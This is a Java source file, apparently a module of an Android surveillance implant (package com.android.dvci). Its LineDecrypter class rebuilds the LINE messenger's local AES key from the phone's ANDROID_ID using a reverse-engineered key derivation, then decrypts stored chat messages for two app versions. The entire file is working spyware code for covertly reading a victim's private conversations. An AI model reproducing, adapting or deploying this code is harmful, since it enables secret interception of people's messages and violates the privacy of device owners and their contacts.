package com.android.dvci.module.chat.line;

import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.mm.M;

import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.util.HashMap;
import java.util.LinkedHashMap;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

/**
 * Created by zad on 05/05/15.
 */
public final class LineDecrypter {
	public static final String TAG = M.e("LineDecrypter");

	private static final int LINE_VERSION_5_1 = 0;
	private static final int LINE_VERSION_4_7 = 1;

	static LineDecrypter a;
	static int version;
	final int d;
	final byte e;
	final byte f;
	final byte g;
	static LinkedHashMap<Long,byte[]> keys;

	static {
		LineDecrypter.a = null;
		keys = new LinkedHashMap<Long, byte[]>();
		keys.put(15485863l, getKeyFromAndroidId(15485863l)); //version 5.1
	}

	public LineDecrypter(String version) {
		super();
		this.d = 16;
		this.e = 83;
		this.f = -71;
		this.g = -7;
		this.version = LINE_VERSION_4_7;
		if(version.startsWith("5.1")){
			this.version = LINE_VERSION_5_1;
		}
	}

	public static LineDecrypter getDecrypter(String version) {
		if (LineDecrypter.a == null) {
			LineDecrypter.a = new LineDecrypter(version);
		}

		return LineDecrypter.a;
	}

	public static boolean isEncryptedLine(String enc) {
		try {
			 Base64.decode(enc, 0);
			return true;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (isEncryptedLine): base64 conversion error for string=" + enc);
			}
		}
		return false;
	}

	public static String decrypt_aes(String enc,String v) {
		String nullS = "null";
		String s = nullS;
		getDecrypter(v);
		if(version == LINE_VERSION_5_1) {
			try {
				byte[] v0 = decrypt("AES", null, getDecrypter(v).getKeyInPos(LINE_VERSION_5_1), Base64.decode(enc, 0));
				s = new String(v0, 0, v0.length);
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (decrypt_aes 5.1): failure " + enc,ex);
				}
				s = nullS;
			}
		}
		if( s.equalsIgnoreCase(nullS)){
			byte[] chipherTex = new byte[]{};
			try {
				chipherTex = Base64impl.base64Impl(enc);
			} catch (IOException e1) {
			}

			try {
				byte[] v0 = decrypt("AES", null, getDecrypter(v).getKeyInPos(LINE_VERSION_5_1), chipherTex);
				s = new String(v0, 0, v0.length);
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (decrypt_aes 4.7): failure with key " + LINE_VERSION_5_1, ex);
				}
				s = nullS;
			}
		}
		return s;
	}

	private static byte[] getKeyInPos(int position) {
		if(position>keys.size() || position<0){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getKeyInPos): invalid position specified:"+ position+" returning empty key");
			}
			return new byte[]{};
		}
		long seed = (long)keys.keySet().toArray(new Long[]{})[position];
		byte[] key = (byte[]) keys.values().toArray()[position];
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getKeyInPos):returning key for seed:"+seed + " key="+ Base64impl.bytesToHex(key));
		}
		return key;
	}


	public static byte[] decrypt(String proto, AlgorithmParameterSpec spec, byte[] key, byte[] cyphertext) throws BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (decrypting cyphertext[" + cyphertext.length +"] with key["+key.length+"]");
		}
		return getCypherDec(proto, spec, key).doFinal(cyphertext);
	}

	public static Cipher getCypherDec(String proto, AlgorithmParameterSpec algorithmParameterSpec, byte[] key) throws InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException {

		int v2 = Cipher.DECRYPT_MODE;
		SecretKeySpec v0 = new SecretKeySpec(key, "AES");
		Cipher v1 = Cipher.getInstance(proto);
		if (algorithmParameterSpec != null) {
			v1.init(v2, v0, algorithmParameterSpec);
		} else {
			v1.init(v2, v0 );
		}

		return v1;
	}

	public static byte[] getKeyFromAndroidId(long arg2) {
		String android_id = Settings.Secure.getString(Status.getAppContext().getContentResolver(), Settings.Secure.ANDROID_ID);
		if (android_id == null) {
			android_id = "";
		}
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getKeyFromAndroidId): android_id=" + android_id + " hashByte="+ (android_id.hashCode()));
		}
		return getKey(((byte) android_id.hashCode()), arg2);
	}


	public static byte[] getKey(byte string, long key) {
		int v5 = 16;
		int v1 = 0;
		byte[] v3 = new byte[v5];
		v3[0] = string;
		v3[1] = ((byte) (string - 71));
		v3[2] = ((byte) (string - 142));
		int v0;
		for (v0 = 3; v0 < v5; ++v0) {
			v3[v0] = ((byte) (v3[v0 - 3] ^ v3[v0 - 2] ^ -71 ^ v0));
		}
		int v2 = -7;
		byte[] v0_1 = v3.clone();
		v5 = v0_1.length;
		if (key < 2 && key > -2) {
			key = -313187 + 13819823 * key;
		}

		int v3_1 = 0;
		while (v3_1 < v5) {
			int v4 = v5 - 1 & v1 + 1;
			if (Cfg.DEBUG) {
				Check.log(TAG + "gk:", "v4=" + v4);
				Check.log(TAG + "gk:", "v2=" + v2);
			}
			long v6 = (((long) v0_1[v4])) * key + (((long) v2));
			if (Cfg.DEBUG) {
				Check.log(TAG + "gk:", "v6=" + v6);
			}
			byte v2_1 = ((byte) (((int) (v6 >> 32))));
			if (Cfg.DEBUG) {
				Check.log(TAG + "gk:", "V2=v2_1=" + v2_1);
			}
			v1 = ((int) (v6 + (((long) v2_1))));
			if (Cfg.DEBUG) {
				Check.log(TAG + "gk:", "v1=" + v1);
			}
			v2 = v2_1;
			if (v1 < v2_1) {
				++v1;
				v2 = v2_1 + 1;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "gk:", "v2=" + v2);
				Check.log(TAG + "gk:", "-2 - v1=" + (byte) (-2 - v1));
			}
			v0_1[v4] = ((byte) (-2 - v1));

			if (Cfg.DEBUG) {
				Check.log(TAG + "["+v3_1+"]key="+ Base64impl.bytesToHex(v0_1));
			}
			++v3_1;
			v1 = v4;
		}

		return ((byte[]) v0_1);
	}

}
